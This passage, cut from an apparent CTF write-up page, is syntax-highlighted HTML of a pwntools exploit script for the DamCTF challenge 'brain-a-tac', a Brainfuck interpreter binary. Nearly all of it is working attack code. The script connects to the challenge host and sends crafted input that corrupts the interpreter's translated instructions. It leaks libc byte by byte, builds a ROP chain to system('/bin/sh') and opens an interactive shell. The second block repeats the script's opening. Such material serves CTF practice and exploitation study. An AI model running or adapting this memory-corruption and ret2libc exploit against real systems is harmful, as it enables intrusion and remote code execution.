style="color:#1E754F">                return</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 8</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">loop_start </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFF</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFF</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            return</span><span style="color:#393A34"> sp </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        else</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#2F798A"> 0</span><br><br><span style="color:#1E754F">    return</span><span style="color:#2F798A"> 0</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> depth </span><span style="color:#1E754F">else</span><span style="color:#393A34"> sp</span><br><span style="color:#A0ADA0">                #>,[[>],[&#x3C;]>-]-[>]-[&#x3C;.+]++++++++++.</span><br><span style="color:#393A34">official_code </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">>,[[>],[&#x3C;]>-]-[>]-[&#x3C;.+]++++++++++.</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">code </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">>,[[>],[&#x3C;]>-]-[>]-[&#x3C;.+][[->.,+]</span><span style="color:#B5695977">'</span><br><br><span style="color:#393A34">out </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> *</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">code</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">end </span><span style="color:#999999">=</span><span style="color:#393A34"> translate</span><span style="color:#2993a3">(</span><span style="color:#393A34">code</span><span style="color:#999999">,</span><span style="color:#393A34"> out</span><span style="color:#2993a3">)</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">x</span><span style="color:#a65e2b">)</span><span style="color:#1E754F"> for</span><span style="color:#393A34"> x </span><span style="color:#1E754F">in</span><span style="color:#393A34"> out</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># p = process(['./bf',official_code])</span><br><span style="color:#393A34">p </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">brain-a-tac.chals.damctf.xyz</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A">31337</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># gdb.attach(p,'go')</span><br><span style="color:#A0ADA0"># >&#x3C; ., +- []</span><br><span style="color:#A0ADA0"># 12 34 56 78</span><br><span style="color:#393A34">pay </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xff</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 7</span><br><span style="color:#393A34">pay </span><span style="color:#999999">+=</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">02020205</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">02020201</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">02020203</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">02020204</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">01010106</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">ffdd0208</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">pay </span><span style="color:#999999">+=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">'</span><span style="color:#AB5959">+</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">1</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">72</span><span style="color:#AB5959">-</span><span style="color:#2F798A">6</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xff</span><span style="color:#B5695977">'</span><br><span style="color:#A0ADA0"># for x in out:</span><br><span style="color:#A0ADA0">    # pay+=p32(x)</span><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">pay</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    s</span><span style="color:#2993a3">(</span><span style="color:#393A34">pay</span><span style="color:#1e754f">[</span><span style="color:#393A34">i</span><span style="color:#999999">:</span><span style="color:#393A34">i</span><span style="color:#AB5959">+</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># p.interactive()</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">2</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">25b</span><span style="color:#AB5959">+</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x87</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># p.interactive()</span><br><span style="color:#A0ADA0"># s(b'\x00'*0x7e+b'\xff')</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># s(b'\x00'*0x1b0+p32</span><br><span style="color:#A0ADA0"># (0)+b'\x87')</span><br><span style="color:#A0ADA0"># p.recvuntil(p64(2))</span><br><span style="color:#A0ADA0"># pause()</span><br><span style="color:#A0ADA0"># p.interactive()</span><br><span style="color:#A0ADA0"># p.close()</span><br><span style="color:#393A34">x </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xb8</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x3c</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libcbase </span><span style="color:#999999">=</span><span style="color:#393A34"> u8</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xb8</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">x </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libcbase </span><span style="color:#999999">+=</span><span style="color:#393A34"> u8</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 8</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">p8</span><span style="color:#1e754f">(</span><span style="color:#393A34">u8</span><span style="color:#a65e2b">(</span><span style="color:#393A34">x</span><span style="color:#a65e2b">)</span><span style="color:#AB5959">+</span><span style="color:#a65e2b">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">90</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">a3</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">x </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libcbase </span><span style="color:#999999">+=</span><span style="color:#393A34"> u8</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 16</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">p8</span><span style="color:#1e754f">(</span><span style="color:#393A34">u8</span><span style="color:#a65e2b">(</span><span style="color:#393A34">x</span><span style="color:#a65e2b">)</span><span style="color:#AB5959">+</span><span style="color:#a65e2b">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">11</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">2</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">x </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># #11903c</span><br><br><br><span style="color:#393A34">libcbase </span><span style="color:#999999">+=</span><span style="color:#393A34"> u8</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 24</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">x </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libcbase </span><span style="color:#999999">+=</span><span style="color:#393A34"> u8</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">x </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libcbase </span><span style="color:#999999">+=</span><span style="color:#393A34"> u8</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 40</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#AB5959">+</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00\x00</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libcbase </span><span style="color:#999999">=</span><span style="color:#393A34"> libcbase </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">2a3b8</span><br><span style="color:#393A34">rdi </span><span style="color:#999999">=</span><span style="color:#393A34"> libcbase </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">11903c</span><br><span style="color:#393A34">binsh </span><span style="color:#999999">=</span><span style="color:#393A34"> libcbase </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">/bin/sh</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#998418">__next__</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">saddr </span><span style="color:#999999">=</span><span style="color:#393A34"> libcbase </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">binsh</span><span style="color:#1e754f">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">rdi</span><span style="color:#AB5959">+</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">saddr</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#998418">hex</span><span style="color:#1e754f">(</span><span style="color:#393A34">libcbase</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># p.interactive()</span><br><span style="color:#A0ADA0"># pause()</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x01</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># >&#x3C; ., +- []</span><br><span style="color:#A0ADA0"># 12 34 56 78</span><br><span style="color:#A0ADA0"># >,</span><br><span style="color:#A0ADA0"># [</span><br><span style="color:#A0ADA0">#   [>]</span><br><span style="color:#A0ADA0">#   ,</span><br><span style="color:#A0ADA0">#   [&#x3C;]</span><br><span style="color:#A0ADA0">#   >-</span><br><span style="color:#A0ADA0"># ]</span><br><span style="color:#A0ADA0"># -</span><br><span style="color:#A0ADA0"># [>]</span><br><span style="color:#A0ADA0"># -</span><br><span style="color:#A0ADA0"># [&#x3C;.+]</span><br><span style="color:#A0ADA0"># ++++++++++.</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#DBD7CAEE">filename</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">./bf</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">'</span><br><br><span style="color:#DBD7CAEE">sla </span><span style="color:#666666">=</span><span style="color:#CB7676"> lambda</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">s </span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">sl </span><span style="color:#666666">=</span><span style="color:#CB7676"> lambda</span><span style="color:#DBD7CAEE"> s </span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">sa </span><span style="color:#666666">=</span><span style="color:#CB7676"> lambda</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">s </span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendafter</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">s </span><span style="color:#666666">=</span><span style="color:#CB7676"> lambda</span><span style="color:#DBD7CAEE"> s </span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># p=process(filename)</span><br><span style="color:#758575DD"># e=ELF(filename)</span><br><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">libc</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">'</span><br><span style="color:#758575DD"># context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)</span><br><span style="color:#758575DD"># gdb.attach(p)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> translate</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">:</span><span style="color:#B8A965"> str</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> output</span><span style="color:#CB7676">=</span><span style="color:#4D9375">None</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> start</span><span style="color:#CB7676">=</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> depth</span><span style="color:#CB7676">=</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> output </span><span style="color:#CB7676">is</span><span style="color:#4D9375"> None</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        output </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> *</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    sp </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> start</span><br><span style="color:#DBD7CAEE">    loop_start </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> start</span><br><br><span style="color:#4D9375">    while</span><span style="color:#DBD7CAEE"> sp </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> and</span><span style="color:#DBD7CAEE"> code</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> '</span><span style="color:#C99076">\0</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        ch </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> code</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#5eaab5">]</span><br><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> ch </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            output</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFF00</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#4C9A91"> 1</span><br><span style="color:#DBD7CAEE">            sp </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span><br><span style="color:#4D9375">        elif</span><span style="color:#DBD7CAEE"> ch </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">&#x3C;</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            output</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFF00</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#4C9A91"> 2</span><br><span style="color:#DBD7CAEE">            sp </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span><br><span style="color:#4D9375">        elif</span><span style="color:#DBD7CAEE"> ch </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">.</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            output</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFF00</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#4C9A91"> 3</span><br><span style="color:#DBD7CAEE">            sp </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span><br><span style="color:#4D9375">        elif</span><span style="color:#DBD7CAEE"> ch </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">,</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            output</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFF00</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#4C9A91"> 4</span><br><span style="color:#DBD7CAEE">            sp </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span><br><span style="color:#4D9375">        elif</span><span style="color:#DBD7CAEE"> ch </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">+</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            output</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFF00</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#4C9A91"> 5</span><br><span style="color:#DBD7CAEE">            sp </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span><br><span style="color:#4D9375">        elif</span><span style="color:#DBD7CAEE"> ch </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">-</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            output</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFF00</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#4C9A91"> 6</span><br><span style="color:#DBD7CAEE">            sp </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span><br><span style="color:#4D9375">        elif</span><span style="color:#DBD7CAEE"> ch </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">[</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            output</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFF00</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#4C9A91"> 7</span><br><span style="color:#DBD7CAEE">            jump_target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> translate</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> output</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> sp </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> depth </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> jump_target </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span><br><span style="color:#4D9375">                return</span><span style="color:#4C9A91"> 0</span><br><span style="color:#DBD7CAEE">            output</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">jump_target </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFF</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#4d9375">]</span><span 